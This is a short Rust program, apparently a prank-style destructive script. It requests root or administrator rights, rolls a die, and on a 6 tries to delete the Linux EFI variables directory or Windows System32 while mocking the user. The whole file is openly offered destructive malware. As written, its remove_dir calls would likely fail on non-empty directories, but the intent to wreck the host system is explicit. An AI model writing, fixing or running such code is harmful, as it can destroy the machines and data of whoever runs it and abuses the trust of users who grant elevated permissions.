use rand::Rng;
use std::fs;
use std::time::Duration;
use std::thread::sleep;

#[cfg(target_os = "windows")]
use is_elevated::is_elevated;

#[cfg(target_family = "unix")]
use sudo::escalate_if_needed;

fn main() {
    #[cfg(target_os = "windows")]
    if !is_elevated() {
        println!("This program only works with admin perms, make sure to run as administrator");
    }

    #[cfg(target_family = "unix")]
    escalate_if_needed()
        .expect("Couldn't relaunch the program with root");

    println!("Hello fellow system admin, the moment you ran this software with admin perms. You had allowed me to delete your system libs, so let's play a game.\n");
    println!("I roll a six faced dice, and if it lands on a 6. I delete your essential system binaries. Ready or not here I come...\n");
    sleep(Duration::from_millis(8000));
    println!("The dice says...");
    sleep(Duration::from_millis(2000));

    let num = rand::thread_rng().gen_range(0..7);

    if num == 6 {
        println!("You got a {}. I hope you don't miss your binaries", num);
        #[cfg(target_os = "macos")]
            println!("Lmao what a loser you're on macos, I won't even bother");

        #[cfg(target_os = "linux")]
        fs::remove_dir("/sys/firmware/efi/efivars")
            .expect("Error removing directory >:(");

        #[cfg(target_os = "windows")]
        fs::remove_dir("C:\\Windows\\System32")
            .expect("Error removing directory >:(");
    } else {
        println!("I guess you survived huh, {}", num);
    }
}
